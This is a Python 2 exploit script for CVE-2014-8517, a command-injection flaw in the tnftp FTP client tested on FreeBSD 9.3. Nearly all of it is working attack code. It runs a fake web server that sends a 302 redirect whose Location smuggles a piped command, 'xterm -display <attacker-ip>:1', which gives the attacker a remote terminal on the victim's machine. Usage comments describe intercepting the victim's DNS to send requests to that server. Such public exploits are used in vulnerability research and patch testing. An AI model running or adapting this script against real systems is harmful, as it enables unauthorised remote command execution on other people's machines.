#!/usr/bin/env python2
#
# Exploit Title: [tnftp BSD exploit]
# Date: [11/29/2014]
# Exploit Author: [dash]
# Vendor Homepage: [www.freebsd.org]
# Version: [FreeBSD 8/9/10]
# Tested on: [FreeBSD 9.3]
# CVE : [CVE-2014-8517]

# tnftp exploit (CVE-2014-8517)tested against freebsd 9.3
# https://www.freebsd.org/security/advisories/FreeBSD-SA-14:26.ftp.asc
#
# 29 Nov 2014 by dash@hack4.org
#
# usage: 
# 
# redirect the vulnerable ftp client requests for http to your machine
#
# client will do something like: 
# ftp http://ftp.freebsd.org/data.txt
#
# you will intercept the dns request and redirect victim to your fake webserver ip
#
# attacker: start on 192.168.2.1 Xnest: Xnest -ac :1 
# probably do also xhost+victimip
#
# attacker: python CVE-2014-8517.py 192.168.1.1 81 192.168.1.1
# 
# sadly you cannot put a slash behind the | also www-encoded is not working
# plus problems with extra pipes
# this renders a lot of usefull commands useless
# so xterm -display it was ;)
#
# *dirty* *dirdy* *dyrdy* *shell* !
#

import os
import sys
import time
import socket


def usage():
	print "CVE-2014-8517 tnftp exploit"
	print "by dash@hack4.org in 29 Nov 2014"
	print
	print "%s <redirect ip> <redirect port> <reverse xterm ip>"% (sys.argv[0])
	print "%s 192.168.1.1 81 192.168.2.1"% (sys.argv[0])

#bind a fake webserver on 0.0.0.0 port 80
def webserveRedirect(redirect):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("0.0.0.0",80))
	s.listen(3)
	h, c = s.accept()

	#wait for request
	#print h.recv(1024)

	#send 302 
	print "[+] Sending redirect :>"
	h.send(redirect)
	s.close()
	return 0

#bind a fake webserver on port %rport
def deliverUgga(owned):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind(("0.0.0.0",rport))
	s.listen(3)
	h, c = s.accept()

#	print h.recv(1024)
	print "[+] Deliver some content (shell is spwaned now)"
	h.send(owned)
	s.close()

	return 0

owned="""HTTP/1.1 200 Found
Date: Fri, 29 Nov 2014 1:00:03 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 5
Connection: close
Content-Type: text/html; charset=iso-8859-1


ugga ugga
"""

if(os.getuid())!=0:
	print "[-] Sorry, you need root to bind port 80!"
	sys.exit(1)

if len(sys.argv)<3:
	usage()
	sys.exit(1)

rip = sys.argv[1]
rport = int(sys.argv[2])
revip = sys.argv[3]

print "[+] Starting tnftp BSD client side exploit (CVE-2014-8517)"
print "[+] Dont forget to run Xnest -ac :1"

# ok, lets use xterm -display
cmd = "xterm -display %s:1" % (revip)
cmd = cmd.replace(" ","%20")

print "[+] Payload: [%s]" % cmd

redirect = 	"HTTP/1.1 302\r\n"\
		"Content-Type: text/html\r\n"\
		"Connection: keep-alive\r\n"\
		"Location: http://%s:%d/cgi-bin/|%s\r\n"\
 		"\r\n\r\n" % (rip,rport,cmd)

#child process owned data delivery
uggapid = os.fork()
if uggapid == 0:
	uggapid = os.getpid()
	deliverUgga(owned)
else:
#child proces for webserver redirect
	webpid = os.fork()
	if webpid == 0:
		webpid = os.getpid()
		webserveRedirect(redirect)



#childs, come home!
try:
	os.waitpid(webpid,0)
except:
	pass
try:
	os.waitpid(uggapid,0)
except:
	pass

#oh wait :>
time.sleep(5)
